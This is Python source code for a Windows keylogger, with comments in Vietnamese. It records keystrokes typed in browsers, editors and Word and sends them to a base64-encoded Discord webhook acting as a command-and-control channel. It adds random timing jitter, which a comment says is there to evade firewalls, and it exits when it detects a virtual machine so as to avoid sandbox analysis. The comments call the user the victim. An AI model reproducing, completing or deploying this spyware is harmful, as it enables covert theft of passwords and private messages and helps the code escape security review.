import urllib.request
import json
from pynput import keyboard
import base64
import ctypes
import time
import random
import threading
import uuid
import sys

LAB_MODE = False
# === CẤU HÌNH C2 ===
# Dán cái link Webhook vừa copy ở Bước 1 vào đây
ENCODED_WEBHOOK = ""

# Bộ đệm chứa các phím gõ
keystroke_buffer = ""

# Danh sách các từ khóa cửa sổ muốn nghe lén
# Cứ cửa sổ nào có tên chứa chữ này là nó bắt đầu ghi log
TARGET_WINDOWS = ["Notepad", "Chrome", "Code", "Cursor", "Word", "Edge"]
MAX_BUFFER_SIZE = 50
MAX_WAIT_TIME = 60
FORCE_FLUSH_TIME = 180
last_send_time = time.time()

def is_virtual_machine():
    """Anti-VM: check MAC address and RAM < 4GB"""
    try:
        # 1. Check MAC Address (VMware, VirtualBox, Hyper-V)
        mac_num = hex(uuid.getnode()).replace('0x', '').upper()
        mac = mac_num.zfill(12)
        vm_mac_prefixes = ['080027', '000569', '000C29', '001C14', '005056', '00155D', '0003FF']
        for prefix in vm_mac_prefixes:
            if mac.startswith(prefix): return True

        # 2. Check RAM < 4GB (Chọc API Windows)
        class MEMORYSTATUSEX(ctypes.Structure):
            _fields_ = [("dwLength", ctypes.c_ulong), ("dwMemoryLoad", ctypes.c_ulong),
                        ("ullTotalPhys", ctypes.c_ulonglong), ("ullAvailPhys", ctypes.c_ulonglong),
                        ("ullTotalPageFile", ctypes.c_ulonglong), ("ullAvailPageFile", ctypes.c_ulonglong),
                        ("ullTotalVirtual", ctypes.c_ulonglong), ("ullAvailVirtual", ctypes.c_ulonglong),
                        ("sullAvailExtendedVirtual", ctypes.c_ulonglong)]
        stat = MEMORYSTATUSEX()
        stat.dwLength = ctypes.sizeof(MEMORYSTATUSEX)
        ctypes.windll.kernel32.GlobalMemoryStatusEx(ctypes.byref(stat))
        
        if (stat.ullTotalPhys / (1024**3)) < 4.0: 
            return True
            
        return False
    except Exception: 
        return True # Lỗi không lấy được thông tin thì cứ auto cho là VM để an toàn

def get_active_window_title():
    """Uses Win32 API to get the active window title"""
    # Lấy ID của cửa sổ đang hiển thị trên cùng
    hwnd = ctypes.windll.user32.GetForegroundWindow()
    # Lấy độ dài của cái tên cửa sổ đó
    length = ctypes.windll.user32.GetWindowTextLengthW(hwnd)
    # Tạo một bộ đệm trống để chứa text
    buff = ctypes.create_unicode_buffer(length + 1)
    # Rút tên cửa sổ nhét vào bộ đệm
    ctypes.windll.user32.GetWindowTextW(hwnd, buff, length + 1)
    
    return buff.value

def exfiltrate_data(data):
    """Packages text and sends it to Discord via HTTP POST"""
    if not data.strip():
        return
        
    payload = {
        "content": chr(96)*3 + "[Intercepted Log]:\n" + data + chr(96)*3,
        "username": "Live Context Tracker"
    }
    
    try:
        # Giải mã link Discord từ Base64 ngược về String
        decrypted_url = base64.b64decode(ENCODED_WEBHOOK).decode('utf-8').strip()
        
        headers_config = {
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
        }
        
        req = urllib.request.Request(
            decrypted_url, # Dùng link đã giải mã ở đây
            data=json.dumps(payload).encode('utf-8'), 
            headers=headers_config
        )
        urllib.request.urlopen(req)
        
    except Exception as e:
        print(f"[!] C2 connection error: {e}")

def watchdog_force_flush():
    """Background thread that monitors buffer flush timeout"""
    global keystroke_buffer, last_send_time
    
    while True:
        time.sleep(5) # Cứ 5 giây kiểm tra 1 lần
        
        current_time = time.time()
        time_elapsed = current_time - last_send_time
        
        # Nếu đã lố 3 phút VÀ trong đệm đang có dữ liệu kẹt lại
        if time_elapsed >= FORCE_FLUSH_TIME and keystroke_buffer.strip():
            print("[*] Force flush triggered by timeout!")
            exfiltrate_data(keystroke_buffer)
            keystroke_buffer = ""
            last_send_time = time.time() # Reset đồng hồ

def on_press(key):
    """Keyboard hook handler for key press events"""
    global keystroke_buffer, last_send_time
    
    # --- FIX BUG 2: KIỂM TRA NGỮ CẢNH (CONTEXT-AWARE) ---
    current_window = get_active_window_title()
    is_target = any(target in current_window for target in TARGET_WINDOWS)
    
    # Nếu không phải cửa sổ mục tiêu -> Bỏ qua, không lưu log
    if not is_target:
        return
        
    # --- XỬ LÝ PHÍM GÕ VÀO BỘ ĐỆM ---
    try:
        if hasattr(key, 'char') and key.char:
            keystroke_buffer += key.char
    except AttributeError:
        if key == keyboard.Key.space:
            keystroke_buffer += " "
        elif key == keyboard.Key.enter:
            keystroke_buffer += "\n"
        elif key == keyboard.Key.backspace:
            keystroke_buffer = keystroke_buffer[:-1]

    # --- FIX BUG 3: NETWORK BEACONING & DATA INTEGRITY ---
    current_time = time.time()
    time_elapsed = current_time - last_send_time
    
    # Tạo độ nhiễu ngẫu nhiên (Jitter) từ -10 đến +10 giây để lừa Firewall
    jitter_time = MAX_WAIT_TIME + random.randint(-10, 10)

    # 1. Soft Limit: Gom đủ dung lượng hoặc đủ thời gian chờ
    ready_to_send = len(keystroke_buffer) >= MAX_BUFFER_SIZE or time_elapsed >= jitter_time

    # 2. Natural Boundary: Chờ nạn nhân gõ xong chữ (Space) hoặc xong câu (Enter)
    is_natural_break = (key == keyboard.Key.space or key == keyboard.Key.enter)

    # CHỈ GỬI KHI ĐẠT ĐỦ 2 ĐIỀU KIỆN ĐỂ BẢO TOÀN DỮ LIỆU
    if ready_to_send and is_natural_break:
        if keystroke_buffer.strip(): 
            exfiltrate_data(keystroke_buffer)
            # Reset lại bộ đệm và bộ đếm thời gian sau khi gửi thành công
            keystroke_buffer = ""
            last_send_time = current_time

def start_tracker():
    """Start the surveillance engine"""
    # 1. Bật luồng Watchdog chạy ngầm (daemon=True để nó tự tắt khi script chính tắt)
    watchdog = threading.Thread(target=watchdog_force_flush, daemon=True)
    watchdog.start()

    # 2. Bật Listener lắng nghe bàn phím
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()



if __name__ == "__main__":
    # --- LỚP PHÒNG THỦ VÒNG NGOÀI (ANTI-VM) ---
    print("[*] Checking runtime environment...")
    if is_virtual_machine():
        if not LAB_MODE:
            print("[!] WARNING: Sandbox detected! Self-destructing!")
            sys.exit(0) # Thực chiến: Chết không để lại dấu vết
        else:
            print("[!] LAB MODE ON: VM detected but continuing for reporting.")
    else:
        print("[*] Native environment. Safe to execute.")

    print("[*] Live Context Provider running in background...")
    start_tracker()